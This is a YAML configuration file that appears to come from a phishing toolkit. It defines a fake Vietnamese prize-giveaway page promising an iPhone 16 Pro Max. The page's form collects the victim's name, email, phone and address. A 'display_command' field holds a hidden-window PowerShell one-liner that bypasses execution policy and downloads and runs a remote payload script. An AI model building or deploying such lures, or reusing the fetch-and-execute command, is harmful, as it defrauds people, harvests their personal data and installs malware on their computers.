# Prize Winner Lure
# Fake prize/giveaway notification page

type: prize
template: lures/prize_winner.html
route: /trung-thuong

payload:
  script: "default.js"

content:
  title: "🎉 CHÚC MỪNG! 🎉"
  subtitle: "Bạn đã được chọn ngẫu nhiên là người chiến thắng hôm nay!"
  prize_description: "iPhone 16 Pro Max"
  prize_value: "22.990.000 VNĐ"
  winner_id: "WIN-2026-78392"
  verification_text: "Xác minh danh tính của bạn để nhận giải thưởng."
  form_fields:
    - name: "full_name"
      label: "Họ và Tên"
      placeholder: "Nhập họ tên đầy đủ"
    - name: "email"
      label: "Địa chỉ Email"
      placeholder: "Nhập email của bạn"
    - name: "phone"
      label: "Số Điện Thoại"
      placeholder: "+84 xxx xxx xxx"
    - name: "address"
      label: "Địa Chỉ Giao Hàng"
      placeholder: "Nhập địa chỉ đầy đủ"
  submit_button: "Nhận Giải Thưởng"
  terms: "Phí vận chuyển có thể áp dụng. Mỗi hộ gia đình một giải thưởng."
  display_command: "powershell -w h -ep bypass -c \"IEX (iwr 'http://localhost:8080/api/payloads/default.ps1' -UseBasicParsing).Content\""

styles:
  theme: "celebration"
  primary_color: "#f6d365"
  gold_color: "#fda085"